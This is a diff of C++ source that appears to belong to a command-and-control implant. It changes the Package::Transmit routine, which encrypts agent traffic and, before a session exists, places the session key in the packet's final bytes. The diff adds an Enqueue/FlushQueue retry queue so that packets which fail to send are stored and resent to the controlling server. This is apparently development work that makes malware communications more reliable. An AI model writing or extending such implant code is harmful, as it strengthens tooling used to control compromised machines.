@@ -678,7 +678,7 @@ auto DECLFN Package::Transmit(
     PVOID  RetBuffer     = nullptr;
     UINT64 Retsize       = 0;
 
-    ULONG EncryptOffset  = 36; // agent_id size
+    ULONG EncryptOffset  = 36;
     ULONG PlainLen       = Package->Length - EncryptOffset;
     ULONG PaddedLen      = Self->Crp->CalcPadding( PlainLen );
     ULONG TotalPacketLen = EncryptOffset + PaddedLen;
@@ -689,18 +689,15 @@ auto DECLFN Package::Transmit(
     Package->Buffer = KhReAlloc( Package->Buffer, TotalPacketLen );
     Package->Length = TotalPacketLen;
 
-    // prepare for pack encrypted buffer
     PBYTE EncBuffer = (PBYTE)Self->Mm->Alloc( nullptr, TotalPacketLen, MEM_COMMIT, PAGE_READWRITE );
     if ( ! EncBuffer ) return FALSE;
 
     Mem::Copy( EncBuffer, Package->Buffer, EncryptOffset );
     Mem::Copy( EncBuffer + EncryptOffset, B_PTR( Package->Buffer ) + EncryptOffset, PlainLen );
 
-    // encrypt it
     Self->Crp->AddPadding( EncBuffer + EncryptOffset, PlainLen, PaddedLen );
     Self->Crp->Encrypt( EncBuffer + EncryptOffset, PaddedLen );
 
-    // if not connected, send the encryption key into 16 final bytes
     if ( ! Self->Session.Connected ) {
         if ( TotalPacketLen < sizeof( Self->Crp->LokKey ) ) {
             Self->Mm->Free( EncBuffer, 0, MEM_RELEASE );
@@ -713,14 +710,21 @@ auto DECLFN Package::Transmit(
         );
     }
 
+    this->FlushQueue();
+
     SendData.Ptr  = (PBYTE)EncBuffer;
     SendData.Size = TotalPacketLen;
 
     if ( Self->Tsp->Send( &SendData, &RecvData ) ) {
         Success = TRUE;
+    } else {
+        this->Enqueue( EncBuffer, TotalPacketLen );
+        EncBuffer = nullptr;
     }
 
-    Self->Mm->Free( EncBuffer, TotalPacketLen, MEM_RELEASE );
+    if ( EncBuffer ) {
+        Self->Mm->Free( EncBuffer, TotalPacketLen, MEM_RELEASE );
+    }
     
     if ( Success && RecvData.Ptr && RecvData.Size ) {
         UCHAR* DecryptBuff   = RecvData.Ptr + EncryptOffset;
@@ -744,6 +748,69 @@ auto DECLFN Package::Transmit(
     }
 
     return Success;
+}
+
+auto DECLFN Package::Enqueue(
+    _In_ PVOID Buffer,
+    _In_ ULONG Length
+) -> VOID {
+    TRANSPORT_NODE* Node = (TRANSPORT_NODE*)KhAlloc( sizeof(TRANSPORT_NODE) );
+    if ( ! Node ) return;
+
+    Node->Buffer = KhAlloc( Length );
+    if ( ! Node->Buffer ) {
+        KhFree( Node );
+        return;
+    }
+
+    Mem::Copy( Node->Buffer, Buffer, Length );
+    Node->Length = Length;
+    Node->Next   = nullptr;
+
+    if ( ! this->QueueHead ) {
+        this->QueueHead = Node;
+    } else {
+        TRANSPORT_NODE* Cur = this->QueueHead;
+        while ( Cur->Next ) {
+            Cur = (TRANSPORT_NODE*)Cur->Next;
+        }
+        Cur->Next = (TRANSPORT_NODE*)Node;
+    }
+
+    this->QueueCount++;
+    KhDbg("Packet queued - Count: %d, Size: %d", this->QueueCount, Length);
+}
+
+auto DECLFN Package::FlushQueue( VOID ) -> VOID {
+    TRANSPORT_NODE* Cur  = this->QueueHead;
+    TRANSPORT_NODE* Prev = nullptr;
+
+    while ( Cur ) {
+        TRANSPORT_NODE* Next = (TRANSPORT_NODE*)Cur->Next;
+
+        MM_INFO SendData = { 0 };
+        SendData.Ptr  = (PBYTE)Cur->Buffer;
+        SendData.Size = Cur->Length;
+
+        if ( Self->Tsp->Send( &SendData, nullptr ) ) {
+            KhDbg("Queued packet sent - Size: %d", Cur->Length);
+
+            if ( Prev ) {
+                Prev->Next = Cur->Next;
+            } else {
+                this->QueueHead = (TRANSPORT_NODE*)Cur->Next;
+            }
+
+            KhFree( Cur->Buffer );
+            KhFree( Cur );
+            this->QueueCount--;
+
+            Cur = (TRANSPORT_NODE*)( Prev ? Prev->Next : (TRANSPORT_NODE*)this->QueueHead );
+        } else {
+            KhDbg("Queued packet retry failed - stopping flush");
+            break;
+        }
+    }
 }
 
 auto DECLFN Package::Byte( 
